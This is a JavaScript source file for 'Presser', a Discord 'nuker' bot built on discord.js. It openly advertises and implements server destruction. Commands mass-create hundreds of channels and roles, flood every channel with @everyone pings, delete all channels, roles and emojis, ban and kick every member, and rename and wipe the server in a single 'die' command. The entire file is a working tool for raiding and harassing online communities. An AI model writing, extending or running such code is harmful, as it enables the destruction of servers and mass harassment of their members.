// https://github.com/17teen
// Discord: 7teen#3868

const { Client, Intents, MessageEmbed } = require('discord.js');
const client = new Client({ ws: { intents: new Intents(Intents.ALL) } });
const { red, green, yellow, greenBright, redBright, yellowBright, blueBright } = require('chalk');
const { token, prefix, founder, DisableEveryone, ID } = require('./settings.json');

const presser = String.raw`

                                                   
                     ██▓███   ██▀███  ▓█████   ██████   ██████ ▓█████  ██▀███  
                    ▓██░  ██▒▓██ ▒ ██▒▓█   ▀ ▒██    ▒ ▒██    ▒ ▓█   ▀ ▓██ ▒ ██▒
                    ▓██░ ██▓▒▓██ ░▄█ ▒▒███   ░ ▓██▄   ░ ▓██▄   ▒███   ▓██ ░▄█ ▒
                    ▒██▄█▓▒ ▒▒██▀▀█▄  ▒▓█  ▄   ▒   ██▒  ▒   ██▒▒▓█  ▄ ▒██▀▀█▄  
                    ▒██▒ ░  ░░██▓ ▒██▒░▒████▒▒██████▒▒▒██████▒▒░▒████▒░██▓ ▒██▒
                    ▒▓▒░ ░  ░░ ▒▓ ░▒▓░░░ ▒░ ░▒ ▒▓▒ ▒ ░▒ ▒▓▒ ▒ ░░░ ▒░ ░░ ▒▓ ░▒▓░
                    ░▒ ░       ░▒ ░ ▒░ ░ ░  ░░ ░▒  ░ ░░ ░▒  ░ ░ ░ ░  ░  ░▒ ░ ▒░
                    ░░         ░░   ░    ░   ░  ░  ░  ░  ░  ░     ░     ░░   ░ 
                    ░        ░  ░      ░        ░     ░  ░   ░     
                                                            
                                                                      

                                        Author: 7teen#3868

`;

console.log(red(presser));


client.on("ready", () => {
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log(greenBright(`                                      Logged in as: ${client.user.username}#${client.user.discriminator}`));
    console.log(greenBright(`                                      Prefix: ${prefix}`));
    console.log(greenBright(`                                      DisableEveryone: ${DisableEveryone}`));
    console.log(greenBright(`                                      Permission Required: ADMINISTRATOR`));
    console.log(red('           ════════════════════════════════════════════════════════════════════════════════'));
    console.log("");
    client.user.setActivity({ type: "PLAYING", name: "presser" }); // Delete this if you wish.
});


client.on("message", async message => {

    if (message.author.bot) return;
    if (message.channel.type === 'dm') return;

    if (message.mentions.everyone === true) {
        return;
    } else if (message.mentions.has(client.user.id)) {
        const helpEmbed = new MessageEmbed()
            .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
            .setTitle('Nuker: Presser')
            .setDescription(`*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
            **Mass Channel:** \`${prefix}
\` [text]
            **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
            **Mass Roles:** \`${prefix}mr\` [text]
            **Delete All Channels:** \`${prefix}chd\`
            **Delete All Roles:** \`${prefix}dr\`
            **Delete All Emojis:** \`${prefix}emoall\`
            **Ban All Members:** \`${prefix}banall\`
            **Kick All Members:** \`${prefix}kall\`
            **Server Annihilation:** \`${prefix}die\` [text]
            `)
            .setThumbnail(``)
            .setFooter(`© Presser | Prefix: ${prefix} | Author: 7teen | Cord: ${founder}`)
            .setColor(0x36393E)
            .setTimestamp(Date.now());
        message.channel.send(helpEmbed);
    }

    // Test Command
    if (message.content.startsWith(prefix + "ping")) {
        message.channel.send("Pong!")
    }

    // Help

    if (!DisableEveryone) {

        if (message.content.startsWith(prefix + 'help')) {
            const helpEmbed = new MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                .setTitle('Nuker: Presser')
                .setDescription(`*War does not termine who is right, only who is left.*\n\n **Nuking:**\n
                **Mass Channel:** \`${prefix}cc\` [text]
                **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                **Mass Roles:** \`${prefix}mr\` [text]
                **Delete All Channels:** \`${prefix}chd\`
                **Delete All Roles:** \`${prefix}dr\`
                **Delete All Emojis:** \`${prefix}emoall\`
                **Ban All Members:** \`${prefix}banall\`
                **Kick All Members:** \`${prefix}kall\`
                **Server Annihilation:** \`${prefix}die\` [text]
                `)
                .setImage(`https://media.discordapp.net/attachments/782211616350404611/800703659435622430/death_grips.gif`)
                .setFooter(`© Presser | Prefix: ${prefix} | Author: 7teen | Cord: ${founder}`)
                .setColor(0x36393E)
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
            message.delete();
        }

        // Mass Channels      

        if (message.content.startsWith(prefix + 'cc')) {
            let args = message.content.split(" ").slice(1);
            var argresult = args.join(' ');
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create(argresult)
                        console.log(yellowBright(`CHANNEL MASSED!`))
                    }
                }
                message.delete();
            
        }

        // Mass Channel & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 250; i++) {
                        message.guild.channels.create('wizzed by ' + message.author.username)

                        for (var i = 0; i < 250; i++) {
                            let channels = message.guild.channels.create('wizzed by ' + message.author.username)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 250; i++) {
                                        channel.send('@everyone ' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 250; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 250; i++) {
                                channel.send('@everyone ' + argresult);
                                console.log(blueBright(`CHANNEL PINGED!`));
                                // other per-channnel logic
                            }
                        }
                    );
                }
            message.delete();
        }


        // Mass Roles

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {
                    const numOfRoles = message.guild.roles.cache.size;
                    const numToMass = 250 - numOfRoles;
                    for (let i = 0; i <= numToMass; i++) {
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).catch((err) => {
                            console.log(red("ERROR: " + err + " #" + i))
                        });
                        console.log(yellow("ROLE BEING MASSED #" + i))
                    }
                }
                message.delete();
            
        }

        // Channel Delete
        if (message.content.startsWith(prefix + 'chd')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                message.delete();
                message.guild.channels.cache.forEach((ch) => {
                    ch.delete().then(() => {
                        console.log(redBright(`CHANNEL FUCKED`));
                    }).catch((err) => {
                        console.log(red("ERROR: " + err))
                    })
                })
            
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ))
                message.delete();
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                    .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                        .catch()
                    ));
                message.delete();
            
        }

        // Delete All Roles                 
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                message.guild.roles.cache.forEach((role) => {
                    if (message.guild.me.roles.highest.position > role.position) {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`))).catch((err) => {
                            console.log(red("ERROR: " + err))
                        });
                    } else {
                        console.log(red("Unable to delete Role."));
                    }
                })
                message.delete();
        }

        // Delete All Emojis 
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} is being deleted successfully`))))
                message.delete();
        }

        // Death.
        if (message.content.startsWith(prefix + 'die')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                message.delete();
                message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach((ch) => {
                    ch.delete().then(() => {
                        // Channel Icon Change
                        message.guild.setIcon('https://media.discordapp.net/attachments/782211616350404611/800703405508919326/death.gif') // changes server pfp
                        console.log(redBright(`CHANNEL FUCKED`));
                    }).catch((err) => {
                        console.log(red("ERROR: " + err))
                    })
                });

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (message.guild.me.roles.highest.position > role.position) {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`))).catch((err) => {
                            console.log(red("ERROR: " + err))
                        });
                    } else {
                        console.log(red("Unable to delete Role."));
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`)
                                }
                            }
                        )
                    }
                }
                setTimeout(() => {
                    const numOfRoles = message.guild.roles.cache.size;
                    const numToMass = 250 - numOfRoles;
                    for (let i = 0; i <= numToMass; i++) {
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).catch((err) => {
                            console.log(red("ERROR: " + err + " #" + i))
                        });
                        console.log(yellow("ROLE BEING MASSED #" + i))
                    }
                }, 3000);
        }

        ////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
    } else {

        if (message.content.startsWith(prefix + 'help')) {
            if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                const helpEmbed = new MessageEmbed()
                    .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                    .setTitle('Nuker: Presser')
                    .setDescription(`*For whatever reason you've summoned me, make sure to do it with no regrets.*\n\n **Nuking:**\n
                    **Mass Channel:** \`${prefix}cc\` [text]
                    **Mass Channel & Ping Stresser:** \`${prefix}mp\` [text]
                    **Mass Roles:** \`${prefix}mr\` [text]
                    **Delete All Channels:** \`${prefix}chd\`
                    **Delete All Roles:** \`${prefix}dr\`
                    **Delete All Emojis:** \`${prefix}emoall\`
                    **Ban All Members:** \`${prefix}banall\`
                    **Kick All Members:** \`${prefix}kall\`
                    **Server Annihilation:** \`${prefix}die\` [text]
                    `)
                    .setThumbnail(``)
                    .setFooter(`© Presser | Prefix: ${prefix} | Author: 7teen | Cord: ${founder}`)
                    .setColor(0x36393E)
                    .setTimestamp(Date.now());
                message.channel.send(helpEmbed);
        }

        // Mass Channels      

        if (message.content.startsWith(prefix + 'cc')) {
            let args = message.content.split(" ").slice(1);
            var argresult = args.join(' ');
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                    if (!argresult) {
                        message.channel.send("*Add an input after the cmd*")
                    } else {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create(argresult)
                            console.log(yellowBright(`CHANNEL MASSED!`))
                        }
                    }
        }

        // Mass Channel & Ping Every Channel

        if (message.content.startsWith(prefix + 'mp')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) {
                    return message.reply('You are not authorised to use any of these tools commands.')
                }
                else {
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    // If you dont give an input
                    if (!argresult) {
                        for (var i = 0; i < 250; i++) {
                            message.guild.channels.create('wizzed by ' + message.author.username)

                            for (var i = 0; i < 250; i++) {
                                let channels = message.guild.channels.create('wizzed by ' + message.author.username)

                                channels.then(
                                    function (channel, index) {
                                        for (var i = 0; i < 250; i++) {
                                            channel.send('@everyone ' + argresult)
                                            console.log(blueBright(`CHANNEL PINGED!`));
                                            // other per-channnel logic
                                        }
                                    }
                                );
                            }

                        }

                    }
                    // If you give an input
                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send('@everyone ' + argresult);
                                    console.log(blueBright(`CHANNEL PINGED!`));
                                    // other per-channnel logic
                                }
                            }
                        );
                    }
                }
        }
        // Mass Create Roles      

        if (message.content.startsWith(prefix + 'mr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                    let args = message.content.split(" ").slice(1);
                    var argresult = args.join(' ');
                    if (!argresult) {
                        message.channel.send("*Add an input after the cmd*")
                    } else {
                        const numOfRoles = message.guild.roles.cache.size;
                        const numToMass = 250 - numOfRoles;
                        for (let i = 0; i <= numToMass; i++) {
                            message.guild.roles.create({
                                data: {
                                    name: `${argresult}`,
                                    position: i++,
                                    color: "RANDOM"
                                }
                            }).catch((err) => {
                                console.log(red("ERROR: " + err + " #" + i))
                            });
                            console.log(yellow("ROLE BEING MASSED #" + i))
                        }
                    }
                
        }

        if (message.content.startsWith(prefix + 'chd')) {
            message.delete();
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                    message.guild.channels.cache.forEach((ch) => {
                        ch.delete().then(() => {
                            console.log(redBright(`CHANNEL FUCKED`));
                        }).catch((err) => {
                            console.log(red("ERROR: " + err))
                        })
                    })
        }

        // Ban All
        if (message.content.startsWith(prefix + 'banall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                
                    message.guild.members.cache.forEach(member => member.ban({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ))
        }

        // Kick All
        if (message.content.startsWith(prefix + 'kall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                    message.guild.members.cache.forEach(member => member.kick({ reason: "Nuking." })
                        .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banning All Members.")
                            .catch()
                        ));
        }

        // Delete All Roles All
        if (message.content.startsWith(prefix + 'dr')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                    message.guild.roles.cache.forEach((role) => {
                        if (message.guild.me.roles.highest.position > role.position) {
                            role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`))).catch((err) => {
                                console.log(red("ERROR: " + err))
                            });
                        } else {
                            console.log(red("Unable to delete Role."));
                        }
                    })
                    message.delete();
        }

        // Delete All Emojis All
        if (message.content.startsWith(prefix + 'emoall')) {
            if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
                if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                    message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" }).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))).catch(
                        console.log(yellow(`EMOJI: ${r.name} was cannot be deleted.`))
                    ));
        }
    }

    // Death.
    if (message.content.startsWith(prefix + 'die')) {
        if (!message.guild.me.hasPermission("ADMINISTRATOR")) return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            if (message.author.id != ID) return message.reply('You are not authorised to use any of these tools commands.')
                message.delete();
                message.guild.setName(`death is near.`).then(console.log(green(`Server Name changed to: ${message.guild.name} Wizzed`))); // changes server name

                // Channel Delete
                message.guild.channels.cache.forEach((ch) => {
                    ch.delete().then(() => {
                        // Channel Icon Change
                        message.guild.setIcon('https://media.discordapp.net/attachments/782211616350404611/800703405508919326/death.gif') // changes server pfp
                        console.log(redBright(`CHANNEL FUCKED`));
                    }).catch((err) => {
                        console.log(red("ERROR: " + err))
                    })
                });

                // Roles
                message.guild.roles.cache.forEach((role) => {
                    if (message.guild.me.roles.highest.position > role.position) {
                        role.delete("Nuking").then(console.log(yellow(`ROLE: ${role.name} is being deleted successfully`))).catch((err) => {
                            console.log(red("ERROR: " + err))
                        });
                    } else {
                        console.log(red("Unable to delete Role."));
                    }
                })

                // Emoji
                message.guild.emojis.cache.forEach(e => e.delete({ reason: "Nuking" },).then(console.log(yellow(`EMOJI: ${e.name} was deleted successfully`))))

                // Massing Channels
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');

                if (!argresult) {
                    message.channel.send("*Add an input after the cmd*")
                } else {

                    for (var i = 0; i < 250; i++) {
                        let channels = message.guild.channels.create(argresult)

                        channels.then(
                            function (channel, index) {
                                for (var i = 0; i < 250; i++) {
                                    channel.send(`${argresult}`);
                                }
                            }
                        )
                    }
                }
                setTimeout(() => {
                  // Ensures it doesn't exceed role creation limit
                    const numOfRoles = message.guild.roles.cache.size;
                    const numToMass = 250 - numOfRoles;
                    for (let i = 0; i <= numToMass; i++) {
                        message.guild.roles.create({
                            data: {
                                name: `${argresult}`,
                                position: i++,
                                color: "RANDOM"
                            }
                        }).catch((err) => {
                            console.log(red("ERROR: " + err + " #" + i))
                        });
                        console.log(yellow("ROLE BEING MASSED #" + i))
                    }
                }, 3000);
    }

})

client.login(token);
